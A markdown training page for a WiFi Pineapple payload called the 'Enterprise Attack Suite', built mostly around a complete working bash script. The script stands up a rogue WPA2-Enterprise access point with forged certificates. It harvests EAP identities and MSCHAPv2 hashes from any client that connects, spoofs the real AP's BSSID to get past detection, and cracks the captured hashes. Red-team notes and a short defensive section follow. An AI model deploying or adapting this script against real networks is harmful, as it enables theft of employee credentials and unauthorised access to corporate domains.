# PP-A05: Enterprise Attack Suite

## Overview

| Attribute | Value |
|-----------|-------|
| **Payload ID** | PP-A05 |
| **Name** | Enterprise Attack Suite |
| **Category** | Advanced Attack |
| **Target** | Enterprise WPA2-Enterprise |
| **Skill Level** | Expert |
| **Risk Level** | Critical |

## Description

A comprehensive attack suite targeting WPA2-Enterprise (802.1X) networks. Implements rogue RADIUS servers, EAP credential harvesting, certificate impersonation, and LDAP/AD credential relay attacks.

---

## Complete Payload

```bash
#!/bin/bash
#####################################################
# Payload: PP-A05 - Enterprise Attack Suite
# Target: WPA2-Enterprise / 802.1X Networks
# Category: Advanced Attack
# Author: Security Trainer
# Version: 1.0.0
#
# WARNING: For authorized security testing only
# Requires: hostapd-wpe, freeradius, or similar
#####################################################

# ============================================
# CONFIGURATION
# ============================================

# Target
TARGET_SSID="${1:-Corporate-WiFi}"
TARGET_CHANNEL="${2:-6}"

# Interfaces
ROGUE_IF="wlan0"
MONITOR_IF="wlan1"

# Server settings
RADIUS_IP="192.168.4.1"
RADIUS_SECRET="testing123"
DHCP_RANGE="192.168.4.100,192.168.4.200"

# EAP settings
SUPPORTED_EAP="PEAP TTLS MD5 GTC MSCHAPV2"

# Directories
LOOT_DIR="/sd/loot/enterprise_$(date +%Y%m%d_%H%M%S)"
CREDS_FILE="$LOOT_DIR/credentials.txt"
HASHES_FILE="$LOOT_DIR/hashes.txt"
LOG_FILE="$LOOT_DIR/enterprise.log"
CERT_DIR="$LOOT_DIR/certs"

# ============================================
# LOGGING
# ============================================

log() {
    local message="$1"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] $message" | tee -a "$LOG_FILE"
}

log_credential() {
    local username="$1"
    local type="$2"
    local data="$3"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')

    echo "========================================" >> "$CREDS_FILE"
    echo "Timestamp: $timestamp" >> "$CREDS_FILE"
    echo "Username: $username" >> "$CREDS_FILE"
    echo "Type: $type" >> "$CREDS_FILE"
    echo "Data: $data" >> "$CREDS_FILE"
    echo "========================================" >> "$CREDS_FILE"

    log "CREDENTIAL CAPTURED: $username ($type)"

    # LED notification
    for i in {1..5}; do
        echo 1 > /sys/class/leds/pineapple:green:system/brightness 2>/dev/null
        sleep 0.2
        echo 0 > /sys/class/leds/pineapple:green:system/brightness 2>/dev/null
        sleep 0.1
    done
}

# ============================================
# CERTIFICATE GENERATION
# ============================================

generate_certificates() {
    log "Generating rogue certificates..."

    mkdir -p "$CERT_DIR"

    # Generate CA certificate
    openssl genrsa -out "$CERT_DIR/ca.key" 2048 2>/dev/null

    openssl req -new -x509 -days 365 \
        -key "$CERT_DIR/ca.key" \
        -out "$CERT_DIR/ca.pem" \
        -subj "/C=US/ST=State/L=City/O=Organization/CN=Corporate Root CA" 2>/dev/null

    # Generate server certificate
    openssl genrsa -out "$CERT_DIR/server.key" 2048 2>/dev/null

    openssl req -new \
        -key "$CERT_DIR/server.key" \
        -out "$CERT_DIR/server.csr" \
        -subj "/C=US/ST=State/L=City/O=Organization/CN=radius.corporate.local" 2>/dev/null

    openssl x509 -req -days 365 \
        -in "$CERT_DIR/server.csr" \
        -CA "$CERT_DIR/ca.pem" \
        -CAkey "$CERT_DIR/ca.key" \
        -CAcreateserial \
        -out "$CERT_DIR/server.pem" 2>/dev/null

    # Create DH parameters
    openssl dhparam -out "$CERT_DIR/dh" 1024 2>/dev/null

    log "Certificates generated in $CERT_DIR"
}

# ============================================
# HOSTAPD-WPE SETUP
# ============================================

setup_hostapd_wpe() {
    log "Configuring hostapd-wpe..."

    # Check for hostapd-wpe
    if ! command -v hostapd-wpe >/dev/null 2>&1; then
        # Fall back to regular hostapd with EAP
        log "WARNING: hostapd-wpe not found, using standard hostapd"
        setup_standard_eap
        return $?
    fi

    # Create hostapd-wpe configuration
    cat > /tmp/hostapd-wpe.conf << EOF
# Interface settings
interface=$ROGUE_IF
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=$TARGET_CHANNEL

# WPA2-Enterprise
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP

# EAP settings
ieee8021x=1
eapol_version=2
eap_user_file=/tmp/hostapd-wpe.eap_user
ca_cert=$CERT_DIR/ca.pem
server_cert=$CERT_DIR/server.pem
private_key=$CERT_DIR/server.key
dh_file=$CERT_DIR/dh

# WPE-specific
eap_server=1
eap_fast_a_id=101112131415161718191a1b1c1d1e1f
eap_fast_a_id_info=hostapd-wpe
eap_fast_prov=3
pac_key_lifetime=604800
pac_key_refresh_time=86400

# Logging
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
EOF

    # Create EAP users file
    cat > /tmp/hostapd-wpe.eap_user << EOF
# EAP users configuration
# Accept any user for credential harvesting
* PEAP,TTLS,TLS,FAST
"*" MSCHAPV2,GTC,TTLS-MSCHAPV2,TTLS-PAP,TTLS-CHAP,MD5 "testing" [2]
EOF

    log "hostapd-wpe configuration created"
    return 0
}

setup_standard_eap() {
    log "Setting up standard EAP (limited credential capture)..."

    # Install FreeRADIUS if available
    if command -v radiusd >/dev/null 2>&1; then
        setup_freeradius
    fi

    # Standard hostapd with external RADIUS
    cat > /tmp/hostapd-eap.conf << EOF
interface=$ROGUE_IF
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=$TARGET_CHANNEL

wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP

ieee8021x=1
auth_server_addr=$RADIUS_IP
auth_server_port=1812
auth_server_shared_secret=$RADIUS_SECRET
EOF

    return 0
}

setup_freeradius() {
    log "Configuring FreeRADIUS for credential harvesting..."

    # This is a simplified setup - full FreeRADIUS requires more config
    cat > /tmp/radiusd.conf << EOF
# Simplified RADIUS config
server default {
    listen {
        type = auth
        ipaddr = $RADIUS_IP
        port = 1812
    }

    authorize {
        eap {
            ok = return
        }
    }

    authenticate {
        eap
    }
}
EOF
}

# ============================================
# NETWORK SETUP
# ============================================

setup_network() {
    log "Configuring network..."

    # Configure interface IP
    ip addr flush dev "$ROGUE_IF" 2>/dev/null
    ip addr add "$RADIUS_IP/24" dev "$ROGUE_IF"
    ip link set "$ROGUE_IF" up

    # Setup DHCP
    cat > /tmp/dnsmasq-enterprise.conf << EOF
interface=$ROGUE_IF
bind-interfaces
dhcp-range=$DHCP_RANGE,12h
dhcp-option=3,$RADIUS_IP
dhcp-option=6,8.8.8.8
log-queries
log-dhcp
log-facility=$LOOT_DIR/dns.log
dhcp-leasefile=$LOOT_DIR/leases.txt
EOF

    dnsmasq -C /tmp/dnsmasq-enterprise.conf

    log "Network configured"
}

# ============================================
# CREDENTIAL PARSING
# ============================================

parse_mschapv2() {
    local log_file="$1"

    log "Parsing MSCHAPv2 challenges..."

    # Extract MSCHAPv2 from hostapd-wpe output
    grep -E "mschapv2|username|challenge|response" "$log_file" | while read line; do
        if echo "$line" | grep -q "username:"; then
            USERNAME=$(echo "$line" | grep -o 'username:[^ ]*' | cut -d: -f2)
        fi

        if echo "$line" | grep -q "challenge:"; then
            CHALLENGE=$(echo "$line" | grep -o 'challenge:[^ ]*' | cut -d: -f2)
        fi

        if echo "$line" | grep -q "response:"; then
            RESPONSE=$(echo "$line" | grep -o 'response:[^ ]*' | cut -d: -f2)

            if [ -n "$USERNAME" ] && [ -n "$CHALLENGE" ] && [ -n "$RESPONSE" ]; then
                # Format for hashcat/john
                echo "${USERNAME}:::${CHALLENGE}:${RESPONSE}" >> "$HASHES_FILE"
                log_credential "$USERNAME" "MSCHAPv2" "${CHALLENGE}:${RESPONSE}"

                # Reset for next capture
                USERNAME=""
                CHALLENGE=""
                RESPONSE=""
            fi
        fi
    done
}

parse_eap_identity() {
    local log_file="$1"

    log "Parsing EAP identities..."

    grep -E "EAP-Identity|identity" "$log_file" | while read line; do
        IDENTITY=$(echo "$line" | grep -oE "[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+" || \
                   echo "$line" | grep -oE "identity='[^']+'" | cut -d"'" -f2)

        if [ -n "$IDENTITY" ]; then
            log_credential "$IDENTITY" "EAP-Identity" "Outer identity captured"
        fi
    done
}

# ============================================
# HASH CRACKING
# ============================================

crack_mschapv2() {
    log "Attempting to crack MSCHAPv2 hashes..."

    if [ ! -s "$HASHES_FILE" ]; then
        log "No hashes to crack"
        return 1
    fi

    local wordlist="/sd/wordlists/rockyou.txt"
    local cracked_file="$LOOT_DIR/cracked.txt"

    # Try with hashcat if available (mode 5500 for NetNTLMv1)
    if command -v hashcat >/dev/null 2>&1 && [ -f "$wordlist" ]; then
        log "Cracking with hashcat..."
        hashcat -m 5500 -a 0 "$HASHES_FILE" "$wordlist" \
            --potfile-path="$LOOT_DIR/hashcat.pot" \
            -o "$cracked_file" 2>/dev/null

        if [ -s "$cracked_file" ]; then
            log "Passwords cracked! See $cracked_file"
            return 0
        fi
    fi

    # Try with john if available
    if command -v john >/dev/null 2>&1 && [ -f "$wordlist" ]; then
        log "Cracking with john..."
        john --wordlist="$wordlist" --format=netntlm "$HASHES_FILE" \
            --pot="$LOOT_DIR/john.pot" 2>/dev/null

        john --show --format=netntlm "$HASHES_FILE" > "$cracked_file" 2>/dev/null

        if [ -s "$cracked_file" ]; then
            log "Passwords cracked! See $cracked_file"
            return 0
        fi
    fi

    log "Hashes saved for offline cracking: $HASHES_FILE"
    return 1
}

# ============================================
# CLIENT MONITORING
# ============================================

monitor_clients() {
    log "Starting client monitor..."

    tail -F /var/log/messages 2>/dev/null | while read line; do
        # Monitor for EAP events
        if echo "$line" | grep -qE "EAP|RADIUS|8021X"; then
            echo "[$(date '+%H:%M:%S')] $line" >> "$LOOT_DIR/eap_events.log"
        fi

        # Check for successful auth attempts
        if echo "$line" | grep -q "authentication"; then
            log "Authentication event detected"
        fi
    done &
    MONITOR_PID=$!
}

monitor_hostapd_wpe() {
    local output_file="$LOOT_DIR/hostapd-wpe.log"

    log "Monitoring hostapd-wpe output..."

    # hostapd-wpe outputs credentials to stdout
    tail -F "$output_file" 2>/dev/null | while read line; do
        # Check for credential capture
        if echo "$line" | grep -qE "username:|mschapv2"; then
            parse_line "$line"
        fi
    done &
    WPE_MONITOR_PID=$!
}

parse_line() {
    local line="$1"

    # Parse username
    if echo "$line" | grep -q "username:"; then
        CURRENT_USER=$(echo "$line" | sed 's/.*username: //' | tr -d '\n')
        log "User attempting auth: $CURRENT_USER"
    fi

    # Parse challenge
    if echo "$line" | grep -q "challenge:"; then
        CURRENT_CHALLENGE=$(echo "$line" | sed 's/.*challenge: //' | tr -d '\n')
    fi

    # Parse response
    if echo "$line" | grep -q "response:"; then
        CURRENT_RESPONSE=$(echo "$line" | sed 's/.*response: //' | tr -d '\n')

        # We have all parts, save the hash
        if [ -n "$CURRENT_USER" ] && [ -n "$CURRENT_CHALLENGE" ] && [ -n "$CURRENT_RESPONSE" ]; then
            local hash="${CURRENT_USER}::::${CURRENT_CHALLENGE}:${CURRENT_RESPONSE}"
            echo "$hash" >> "$HASHES_FILE"
            log_credential "$CURRENT_USER" "MSCHAPv2" "$hash"

            # Clear for next capture
            CURRENT_USER=""
            CURRENT_CHALLENGE=""
            CURRENT_RESPONSE=""
        fi
    fi
}

# ============================================
# EVIL TWIN DETECTION BYPASS
# ============================================

mimic_legitimate_ap() {
    local target_bssid="$1"

    log "Attempting to mimic legitimate AP characteristics..."

    # Note: Full MAC spoofing may not work with all drivers
    # This is for research purposes

    if [ -n "$target_bssid" ]; then
        ip link set "$ROGUE_IF" down
        ip link set "$ROGUE_IF" address "$target_bssid" 2>/dev/null
        ip link set "$ROGUE_IF" up
        log "Attempting to use BSSID: $target_bssid"
    fi
}

# ============================================
# CLEANUP
# ============================================

cleanup() {
    log "Cleaning up..."

    # Stop services
    pkill hostapd-wpe 2>/dev/null
    pkill hostapd 2>/dev/null
    pkill dnsmasq 2>/dev/null
    pkill radiusd 2>/dev/null
    kill $MONITOR_PID 2>/dev/null
    kill $WPE_MONITOR_PID 2>/dev/null

    # Parse any remaining logs
    if [ -f "$LOOT_DIR/hostapd-wpe.log" ]; then
        parse_mschapv2 "$LOOT_DIR/hostapd-wpe.log"
        parse_eap_identity "$LOOT_DIR/hostapd-wpe.log"
    fi

    # Attempt to crack captured hashes
    crack_mschapv2

    # Generate report
    generate_report

    log "Results saved to: $LOOT_DIR"
    exit 0
}

generate_report() {
    cat > "$LOOT_DIR/ENTERPRISE_REPORT.txt" << EOF
========================================
Enterprise Attack Suite Report
========================================

Target SSID: $TARGET_SSID
Channel: $TARGET_CHANNEL
Operation Time: $(date)

========================================
CAPTURED CREDENTIALS
========================================
$(cat "$CREDS_FILE" 2>/dev/null || echo "No credentials captured")

========================================
MSCHAPv2 HASHES (for offline cracking)
========================================
$(cat "$HASHES_FILE" 2>/dev/null || echo "No hashes captured")

========================================
CRACKED PASSWORDS
========================================
$(cat "$LOOT_DIR/cracked.txt" 2>/dev/null || echo "None cracked yet")

========================================
RECOMMENDATIONS
========================================
1. Use captured hashes with hashcat -m 5500
2. Try common corporate password patterns
3. Combine with domain password policy info
4. Consider pass-the-hash if passwords don't crack

========================================
FILES
========================================
$(ls -la "$LOOT_DIR/")

EOF
}

trap cleanup SIGINT SIGTERM EXIT

# ============================================
# MAIN
# ============================================

main() {
    log "=========================================="
    log "PP-A05: Enterprise Attack Suite"
    log "Target: $TARGET_SSID"
    log "=========================================="

    mkdir -p "$LOOT_DIR" "$CERT_DIR"

    # Generate certificates
    generate_certificates

    # Setup network infrastructure
    setup_network

    # Setup rogue AP with EAP
    if ! setup_hostapd_wpe; then
        log "ERROR: Failed to configure enterprise AP"
        exit 1
    fi

    # Start hostapd-wpe
    log "Starting rogue enterprise AP..."

    if command -v hostapd-wpe >/dev/null 2>&1; then
        hostapd-wpe /tmp/hostapd-wpe.conf 2>&1 | tee "$LOOT_DIR/hostapd-wpe.log" &
        HOSTAPD_PID=$!
    else
        hostapd /tmp/hostapd-eap.conf &
        HOSTAPD_PID=$!
    fi

    sleep 3

    if ! kill -0 $HOSTAPD_PID 2>/dev/null; then
        log "ERROR: hostapd failed to start"
        exit 1
    fi

    log "=========================================="
    log "Rogue Enterprise AP Active"
    log "SSID: $TARGET_SSID"
    log "Waiting for victims..."
    log "=========================================="

    # Monitor for credentials
    monitor_hostapd_wpe

    # Keep running
    while kill -0 $HOSTAPD_PID 2>/dev/null; do
        sleep 60

        # Periodic status
        local cred_count=$(grep -c "Username:" "$CREDS_FILE" 2>/dev/null || echo 0)
        local hash_count=$(wc -l < "$HASHES_FILE" 2>/dev/null || echo 0)
        log "Status: $cred_count identities, $hash_count hashes"
    done
}

# ============================================
# EXECUTE
# ============================================

main "$@"
```

---

## Enterprise Attack Techniques

### EAP Types Targeted

| EAP Type | Vulnerability | Credential Type |
|----------|---------------|-----------------|
| EAP-PEAP | Inner auth capture | MSCHAPv2 hash |
| EAP-TTLS | Inner auth capture | Password/hash |
| EAP-MD5 | Weak auth | Password |
| EAP-GTC | Token capture | OTP/password |

### Attack Flow

```
┌─────────────────────────────────────────────────────────────┐
│              ENTERPRISE ATTACK WORKFLOW                     │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   VICTIM                  ROGUE AP                SERVER    │
│   ──────                  ────────                ──────    │
│                                                              │
│   ┌─────┐  EAP-Identity  ┌───────┐                          │
│   │     │───────────────▶│       │  [Capture identity]      │
│   │     │                │       │                          │
│   │     │◀───────────────│       │  EAP-Challenge           │
│   │     │  (TLS tunnel)  │       │                          │
│   │     │───────────────▶│       │                          │
│   │     │                │       │  [Fake cert accepted]    │
│   │     │◀───────────────│       │  Inner auth request      │
│   │     │───────────────▶│       │                          │
│   │     │  MSCHAPv2      │       │  [CAPTURE HASH!]         │
│   └─────┘                └───────┘                          │
│                                                              │
│   Post-Attack:                                               │
│   - Crack MSCHAPv2 hash offline                             │
│   - Use credentials for network access                      │
│   - Pivot to domain resources                               │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Red Team Perspective

### Success Factors

1. **Certificate Trust**: Many clients don't validate certs
2. **Signal Strength**: Overpower legitimate AP
3. **Timing**: Attack during connectivity issues
4. **Social**: Users click through warnings

### Hash Cracking

```bash
# MSCHAPv2 with hashcat
hashcat -m 5500 -a 0 hashes.txt wordlist.txt

# With rules for corporate patterns
hashcat -m 5500 -a 0 hashes.txt wordlist.txt -r corporate.rule

# Example corporate rules:
# Company2024!
# Winter2024
# Password123!
```

---

## Blue Team Perspective

### Detection Methods

| Indicator | Detection |
|-----------|-----------|
| Rogue AP | WIDS, RF scanning |
| Wrong cert | Certificate pinning |
| Auth attempts | RADIUS logging |
| Signal anomaly | Location services |

### Prevention

1. **Certificate Validation**: Enforce on all clients
2. **EAP-TLS**: Mutual certificate auth
3. **WIDS**: Alert on rogue enterprise APs
4. **User Training**: Report unexpected prompts

### Monitoring

```bash
# Monitor RADIUS authentication
tail -f /var/log/freeradius/radius.log | grep -E "Auth|Reject"

# Check for new APs with corporate SSID
iwlist scan | grep -A5 "Corporate-WiFi"
```

---

## Practice Exercises

### Exercise 1: Lab Setup
Configure a test WPA2-Enterprise network with FreeRADIUS.

### Exercise 2: Credential Analysis
Analyze captured MSCHAPv2 hashes and create targeted wordlists.

### Exercise 3: Defensive Testing
Deploy this payload and test your WIDS detection capabilities.

---

## Legal & Ethical Notice

This payload targets authentication systems and captures credentials. Use ONLY:
- With explicit written authorization
- In controlled lab environments
- For security assessments
- Never against production systems without approval

Unauthorized use is a serious crime.

---

[← PP-A04 WIDS Evasion](PP-A04_WIDS_Evasion.md) | [Back to Advanced](README.md)
